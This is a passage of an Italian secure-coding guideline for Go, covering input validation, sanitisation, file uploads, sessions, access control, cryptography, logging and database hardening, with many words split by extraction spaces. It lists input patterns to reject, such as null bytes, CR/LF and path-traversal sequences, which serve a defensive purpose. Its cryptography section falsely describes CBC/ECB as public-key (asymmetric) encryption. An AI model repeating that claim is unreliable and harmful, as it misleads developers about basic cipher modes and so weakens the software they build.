 
 
Linee guida per lo sviluppo sicuro Pag. 151  a 156  
 
7.12.3  Ulteriori indicazioni per lo sviluppo sicuro 
L'input dell'utente e i relativi dati associati rap presentano un rischio se non vengono attuati opport uni 
controlli di "Input Validation" e "Input Sanitizati on". Tutte le procedure di convalida dei dati devon o essere 
eseguite su sistemi affidabili (ad esempio sul serv er) e devono essere eseguite a ogni livello 
dell'applicazione.  
7.12.3.1  Validazione dell’INPUT 
I dati dell’input devono essere considerati non sic uri per impostazione predefinita e accettati solo d opo 
aver effettuato i controlli di sicurezza appropriat i. Anche le fonti dei dati devono essere identifica te come 
attendibili o non affidabili e, in caso di fonti no n attendibili, devono essere eseguiti controlli di convalida.  
Se la convalida fallisce, l'input deve essere rifiu tato.  
Go dispone di librerie native che includono metodi a supporto del processo di validazione e sanitizzaz ione 
dei dati: 
• strconv per la conversione  di stringhe ad altre tipologie di dati: 
o Atoi 
o ParseBool 
o ParseFloat 
o ParseInt 
• strings per gestire  le stringhe e relative proprietà: 
o Trim 
o ToLower 
o ToTitle 
• regexp utilizzabile nelle espressioni regolari per gestire formati  personalizzati. 
• Altre  tecniche per garantire la validità dei dati di inp ut includono: 
o White listing – verificare l’input sulla base di una white list d i caratteri consentiti. 
o Boundary checking  – verificare la lunghezza dei numeri e dei dati. 
o Validazione numerica. 
o Verificare i Null Bytes: ( %00)  
o Verificare i caratteri di linea: %0d , %0a , \r , \n  
o Verificare i caratteri di alterazione del percorso ../ oppure \\..  
NOTA: Assicurarsi che le intestazioni di richiesta e risposta HTTP contengano solo caratteri ASCII . 
 
 
Linee guida per lo sviluppo sicuro Pag. 152  a 156  
 
7.12.3.2  Gestione dei File 
Assicurarsi che gli utenti non siano autorizzati a fornire direttamente dati a tutte le funzioni dinam iche. In 
linguaggi come PHP, il passaggio di dati utente a f unzioni incluse dinamicamente nel codice funzioni è  un 
grave rischio di sicurezza.  
Nel caso di reindirizzamenti dinamici, i dati utent e non devono essere passati. Se è richiesto 
dall'applicazione, è necessario adottare ulteriori controlli, che includono ad esempio: l'accettazione  solo dei 
dati correttamente convalidati e dei relativi URL. Inoltre, è importante assicurarsi che i percorsi a directory 
e file siano mappati in elenchi di indici di percor si predefiniti (assicurarsi di utilizzare tali indi ci).  
Non inviare mai il percorso assoluto del file, util izzare sempre percorsi relativi. 
Per i file e le risorse dell'applicazione, impostar e autorizzazioni di sola lettura. 
L’upload dei file sul server dovrebbe essere limita to ai soli utenti autenticati e solo per alcune tip ologie di 
file accettati. Questo controllo può essere fatto u sando la seguente funzione Go che rileva i tipi MIM E: func 
DetectContentType (data[] byte) string. I file cari cati dagli utenti non devono essere memorizzati nel  
contesto web dell'applicazione, ma in un server di contenuti o in un database. Il percorso su file sys tm in cui 
vengono memorizzati tali file non deve avere privil egi di esecuzione. Se il file server che ospita i d ati caricati 
dall’utente è basato su *NIX, è necessario implemen tare meccanismi di sicurezza come l'ambiente chroot ed 
o montare la directory del file di destinazione com e un'unità logica.      
7.12.3.2.1  Sorgenti dati 
Ogni volta che i dati vengono trasmessi da una font e attendibile a una fonte meno attendibile, è neces sario 
eseguire controlli di integrità. Ciò garantisce che  i dati non siano stati manomessi e che si stanno r icevendo 
i dati previsti. Altri controlli includono: 
• Cross-system consistency checks; 
• Hash totals; 
• Referential integrity; 
• Uniqueness check; 
• Table look up check. 
7.12.3.2.2  Azioni di post-validazione (azioni aggiuntive) 
• informare l'utente che i dati inseriti non rispetta no i requisiti richiesti e pertanto devono essere 
modificati per conformarli alle condizioni richiest e; 
• modificare i dati inviati dall'utente lato server s enza notificare all'utente di tali modifiche. 
7.12.3.2.3  Sanitizzazione 
Dopo aver effettuato i controlli di convalida appro priati, un ulteriore passaggio che viene in genere 
adottato per rafforzare la sicurezza dei dati consi ste nel rimuovere o modificare i caratteri ritenuti  
‘pericolosi’. Le azioni più comuni di sanitizzazion e sono i seguenti: 
• Escaping. Nel package nativo html ci sono due funzi oni usate per la sanitizzazione: una per l'escape 
del testo HTML e un'altra per l'HTML senza escape. La funzione EscapeString(), accetta una stringa 
e restituisce la stessa stringa con i caratteri spe ciali convertiti. (es. ‘<’ viene sostituito con ‘&l t;’). 
Questa funzione converte solo i seguenti cinque car atteri: <,>, &, ' e ". Viceversa c'è anche la 
funzione UnescapeString () per convertire da entità  a caratteri. 
• Rimuovere i TAG. Sebbene il package html/template a bbia una funzione stripTags (), questa non è 
esportabile. Poiché nessun altro package nativo ha una funzione capace di rimuovere tutti i tag, 
l’alternativa è quella di utilizzare librerie di te rze parti o copiare l'intera funzione insieme alle sue 
classi e funzioni private. Alcuni esempi di libreri e di terze parti sono: 
o https://github.com/kennygrant/sanitize 
o Il pacchetto sanitize fornisce funzioni per la sani ficazione di codice HTML e dei percorsi.  
o https://github.com/maxwells/sanitize 
o Una libreria per la sanificazione di HTML che sfrut ti una white list. Semplice da usare. 
o https://github.com/microcosm-cc/bluemonday 
 
 
Linee guida per lo sviluppo sicuro Pag. 153  a 156  
 
o Bonifica codice HTML. 
• Rimuovere le interruzioni di linea, i caratteri di tabulazione (tab), gli spazi bianchi non necessari.  Il 
“text/template” e “html/template” includono un modo  per rimuovere gli spazi bianchi dal 
template, utilizzando un segno meno - all'interno d el delimitatore dell'azione. 
• URL Request Path. Nel pacchetto “net/http” c'è un t ipo di multiplexer di richiesta HTTP chiamato 
ServeMux, che viene utilizzato per far corrisponder e la richiesta in arrivo ai pattern registrati e 
quindi a invocare il gestore che più si avvicina al l' URL richiesto. Oltre al suo scopo principale, si  
occupa anche di sanitizzare l’URL, reindirizzando q ualsiasi richiesta contenente ‘.’ o ‘..’ o ‘/’ ripe tuti 
a un URL equivalente, ma più pulito. Di seguito un  esempio di Mux: 
func main() {  
mux := http.NewServeMux() 
rh := http.RedirectHandler( "http://yourDomain.org" , 307 )  
mux.Handle( "/login" , rh) 
log.Println( "Listening..." )  
http.ListenAndServe( ":3000" , mux)  
} 
7.12.3.3  Gestione Sessione, Controlli Accessi e Crittografia  
7.12.3.3.1  Sessioni 
• La creazione della sessione deve essere eseguita su  un sistema attendibile. 
• Assicurarsi che gli algoritmi utilizzati per genera re l’identificatore di sessione siano sufficienteme nte 
casuali al fine di prevenire una forzatura bruta di  sessione. 
• Una volta assicurato un token sufficientemente fort e, impostare l’opportuno valore per i cookie: 
‘Domain’, ‘Path’, ‘Expires’, ‘HttpOnly’ e ‘Securè. 
• Al momento del login, deve essere sempre generata u na nuova sessione. La vecchia sessione non 
deve essere mai riutilizzata, anche se non è scadut a. Utilizzare anche il parametro “Expire” per 
eseguire la chiusura della sessione in modo da prev enire il “session hijacking”. Un altro aspetto 
importante dei cookie è quello di impedire l'access o simultaneo per lo stesso nome utente. Ciò può 
essere fatto mantenendo un elenco degli utenti conn essi e confrontare il nuovo nome utente di 
accesso con tale elenco. Questo elenco di utenti at tivi viene di solito persistito su un database. 
• Gli identificatori di sessione non devono mai esser e esposti negli URL. Questi dovrebbero essere 
localizzabili solo nei cookie presenti nell'intesta zione http. Un esempio di cattiva pratica è quello di 
passare gli identificatori di sessione come paramet ri della GET. I dati della sessione devono inoltre 
essere protetti dall'accesso non autorizzato da par te di altri utenti del server.  
• È necessario passare da HTTP a HTTPS, al fine di pr evenire potenziali attacchi Man In The Middle 
(MITM), nei quali un attaccante si frappone fra due  endpoint, “fiutando” i pacchetti in transito. In 
tal modo tutto il traffico è visibile e comprensibi le, poiché l’HTTP prevede la trasmissione delle 
informazioni in chiaro. Utilizzando HTTPS in tutte le richieste (pacchetto “crypto/tls” di Go) la 
trasmissione risulta crittografata e il compito per  l’attaccante molto più arduo.  
• In caso di operazioni altamente sensibili o critich e, il token deve essere generato per richiesta 
invece che per sessione. Accertarsi sempre che il t oken sia sufficientemente casuale sia 
sufficientemente lungo da proteggerlo contro possib ili attacchi di forza bruta. 
• Aspetto da considerare nella gestione delle session i è la funzionalità Logout. L'applicazione deve 
fornire un modo per disconnettersi da tutte le pagi ne che richiedono l'autenticazione, nonché 
terminare completamente la sessione e le connession e ad esse associate. In particolare, quando un 
utente si disconnette, il cookie deve essere elimin ato dal client. La stessa azione deve essere 
intrapresa dalla componente che si occupa della mem orizzazione delle informazioni della sessione 
utente. 
7.12.3.3.2  Controllo Accessi 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 154  a 156  
 
• Utilizzare solo gli oggetti di sistema attendibili per le decisioni di autorizzazione all'accesso. 
• Generare un token di sessione lato server, quindi m emorizzare e utilizzare questo token per 
convalidare l'utente e applicare il modello predefi nito di controllo degli accessi. 
• Il componente utilizzato per l'autorizzazione di ac cesso deve essere un unico componente 
(centralizzazione), utilizzato a livello di sito. C iò include quelle funzioni di libreria utilizzate c he 
chiamano servizi di autorizzazione esterni. 
• In caso di eccezione, il controllo degli accessi do vrebbe fallire in modo sicuro. A tale scopo è 
opportuno utilizzare la funzione 'Defer'. 
• Se l'applicazione non può accedere alle informazion i di configurazione, ogni accesso all'applicazione 
deve essere negato. 
• I controlli di autorizzazione devono essere applica ti su ogni richiesta, inclusi gli script eseguiti l ato 
server e le richieste provenienti da tecnologie lat o client come AJAX o Flash. 
• È importante separare correttamente la logica di ge stione dei privilegi dal resto del codice 
applicativo. 
• Altre operazioni importanti in cui i controlli di a ccesso devono essere attuati al fine di impedire ad  
un utente non autorizzato di accedervi, sono: 
o File e altre risorse, 
o Protezione URL’s, 
o Protezioni Funzioni, 
o Riferimenti diretti ad oggetti, 
o Servizi, 
o Dati applicativi, 
o Attributi utente e dati e informaizoni sulle policy . 
• Se i dati di stato devono essere memorizzati lato c lient, è necessario utilizzare la crittografia ed 
effettuare opportuni controlli d'integrità per prev enire possibili manomissioni. 
• Il flusso della logica applicativa deve essere conf orme alle regole di business. 
• Quando si trattano transazioni, il numero di transa zioni che un singolo utente o dispositivo può 
eseguire in un dato periodo di tempo deve essere su periore ai requisiti previsti, ma 
sufficientemente basso da impedire all'utente di es eguire un attacco di tipo DoS. 
• L'impiego della sola intestazione HTTP "referer" è insufficiente per convalidare l'autorizzazione e 
deve essere utilizzato solo come controllo suppleme ntare. 
• Per le sessioni con autenticazione a lungo termine,  l'applicazione deve riesaminare periodicamente 
l'autorizzazione dell'utente per verificare che i p ermessi di quest'ultimo non siano cambiati. Se le 
autorizzazioni sono cambiate, è necessario scollega re l'utente e costringerlo a riautenticarsi. 
• Gli account degli utenti devono essere verificati p eriodicamente, al fine di rispettare le procedure d i 
sicurezza, (ad esempio, disabilitando l'account ute nte dopo 30 giorni dalla data di scadenza della 
password). 
• L'applicazione deve supportare la possibilità di di sabilitare gli account e la chiusura delle sessioni  in 
caso di revoca dell'autorizzazione dell'utente, (ad  es. cambiamento di ruolo, situazione 
occupazionale, ecc.). 
• Gli account di servizio esterno, o che supportano c onnessioni da o verso sistemi esterni, devono 
essere dotati del  più basso possibile livello di p rivilegi. 
7.12.3.3.3  Crittografia e Hashing 
La crittografia deve essere utilizzata ogni qual vo lta è necessario comunicare o memorizzare dati sens ibili. 
Le regole da seguire sono le seguenti: 
• Utilizzare algoritmi sicuri di hashing come l’SHA-2 56. 
• Un caso di utilizzo "semplice" di crittografia è il  protocollo HTTPS - Hyper Text Transfer Protocol 
Secure.  
• AES è lo standard di fatto per quanto riguarda la c rittografia a chiave simmetrica. Questo algoritmo, 
come molte altre cifrature simmetriche, può essere implementato in diverse modalità.  
 
 
Linee guida per lo sviluppo sicuro Pag. 155  a 156  
 
• Utilizzare GCM (Galois Counter Mode) piuttosto che CBC/ECB. GCM è una modalità di cifratura 
autenticata, il che significa che dopo la fase di c rittografia viene aggiunto un tag di autenticazione  al 
testo cifrato, che sarà quindi convalidato prima de lla decodifica dei messaggi, assicurando il 
messaggio da eventuali manomissioni. CBC/ECB, invec e, è una crittografia a chiave pubblica o 
asimmetrica, che utilizza coppie di chiavi: pubblic he e private. La crittografia a chiave pubblica è 
meno performante della crittografia a chiave simmet rica per la maggior parte dei casi, per cui il suo 
uso più comune è la condivisione di una chiave simm etrica tra due parti usando la crittografia 
asimmetrica, in modo da poter utilizzare la chiave simmetrica per scambiare messaggi crittografati 
con crittografia simmetrica. A parte AES, che è una  tecnologia degli anni' 90, gli autori di Go hanno 
iniziato ad implementare e supportare algoritmi di crittografia simmetrica più moderni che 
forniscono anche l'autenticazione, come "chacha20po ly1305". 
• Un altro package da considerare in Go, invece dell’ uso diretto di AES, è “x/crypto/nacl”. La 
“nacl/box” e “nacl/secretbox” in Go sono implementa zioni delle astrazioni di NaCl per l'invio di 
messaggi crittografati per i due casi di utilizzo p iù comuni: 
o Invio di messaggi autenticati e crittografati tra d ue parti utilizzando la crittografia a chiave 
pubblica (nacl/box). 
o Invio di messaggi autenticati e crittografati tra d ue parti usando la crittografia simmetrica 
(a.k.a secret-key). 
• Si deve stabilire e utilizzare una politica e un pr ocesso per la gestione delle chiavi crittografiche,  in 
modo tale da proteggere i dati principali più sensi bili dall'accesso non autorizzato. Pertanto, le 
chiavi crittografiche non devono essere assolutamen te esplicitate, né tanto meno codificate nel 
sorgente (hard coded). 
• Focalizzare l'attenzione sull'impiego di algoritmi crittografici più moderni come l'implementazione 
"https://godoc.org/golang.org/x/crypto" piuttosto c he utilizzare il pacchetto "crypto/*". 
• Tutti i numeri casuali, nomi di file casuali, GUID casuali e stringhe casuali generati applicativament e, 
devono essere creati utilizzando un generatore di n umeri casuali approvato dal modulo 
crittografico, soprattutto quando questi valori son o potenzialmente sensibili e soggetti ad essere 
indovinati. Utilizzare dunque la "crypto/rand" che,  anche se più lenta della "math/rand", risulta 
essere molto più sicura. 
7.12.3.4  Gestione degli Errori e delle Eccezioni 
La gestione degli errori e il logging rappresentano  una parte essenziale nella protezione dell'applica zione e 
dell'infrastruttura. Quando si parla di gestione de gli errori, ci si riferisce all’individuazione di e ventuali errori 
nella logica dell'applicazione che potrebbero causa re il blocco del sistema, a meno che non vengano ge stiti 
correttamente.  
In Go esistono funzioni per la gestione degli error i. Queste sono: il panic, recover e il defer. Quand o uno 
stato di applicazione è panic , l'esecuzione normale viene interrotta, le dichiar azioni di defer  vengono 
eseguite e la funzione torna al suo chiamante. Recover  di solito è utilizzato all'interno delle dichiaraz ioni di 
defer  e consente all'applicazione di riacquistare il con trollo su una routine di panicking e di tornare all a 
normale esecuzione. 
D'altra parte, il logging dettagliato di tutte le o perazioni e delle richieste che si sono verificate nel sistema 
aiuta a determinare quali azioni devono essere adot tate per proteggere il sistema. Poiché gli aggresso ri 
tentano di eliminare tutte le tracce delle loro azi oni cancellando i log, è fondamentale che i file di  log siano 
centralizzati e protetti da accessi non autorizzati . 
Altre azioni: 
• gli sviluppatori devono assicurarsi che non siano d ivulgate informazioni sensibili nelle risposte di 
errore, nonché garantire che nessun gestore di erro ri rilasci informazioni (ad esempio, il debug o le 
informazioni sulle tracce di stack).  
• Il logging deve essere sempre gestito dall'applicaz ione e non deve basarsi sulla configurazione del 
server. Tutte le registrazioni devono essere implem entate da una routine master su un sistema 
affidabile e gli sviluppatori devono inoltre assicu rarsi che i dati sensibili non siano soggetti a log ging 
 
 
Linee guida per lo sviluppo sicuro Pag. 156  a 156  
 
(ad es. Password, informazioni sulla sessione, dett agli di sistema, ecc.) né che ci siano informazioni  
di tracciamento di debug o stack. Inoltre, la regis trazione dovrebbe coprire sia eventi di successo 
che di insuccesso in materia di sicurezza. 
 
Il package nativo di Go che contiene le funzioni di  logging non supporta livelli distinti di verbosità , il che 
significa che tale feature deve essere implementata  a parte. Un altro problema con il logger nativo è che 
non c'è modo di attivare o disattivare il logging p er package. Poiché normalmente sono richieste 
funzionalità di logging adeguate per la manutenzion e e la sicurezza, a tal fine, si utilizza una libre ria di 
registrazione di terze parti come ad esempio: 
• Logrus  - https://github.com/Sirupsen/logrus 
• glog  - https://github.com/golang/glog 
• loggo  - https://github.com/juju/loggo 
Tra queste librerie, la più usata è “ Logrus ”. Glog non più aggiornata da qualche anno. 
Per garantire la validità e l'integrità dei log, de ve essere utilizzata come passo aggiuntivo una funz ione di 
hash crittografica al fine di prevenire possibili m anomissioni dei log. 
7.12.3.5  Sicurezza del Database 
Installazione sicura del server di database: 
• Modificare / impostare una password per account di root; 
• Rimuovere gli accounts “root” che sono accessibili dall'esterno di localhost; 
• Rimuovere eventuali account anonimi; 
• Rimuovere qualsiasi database di prova esistente; 
• Rimuovere eventuali stored procedure non necessarie , pacchetti di utilità, servizi inutili, contenuti 
del fornitore (ad es. Schemi di esempio). 
• Installare il set minimo di funzionalità e opzioni necessarie per il database, per funzionare con Go. 
• Disattivare tutti gli account predefiniti che non s ono richiesti nell'applicazione Web per connettersi  
al database. 
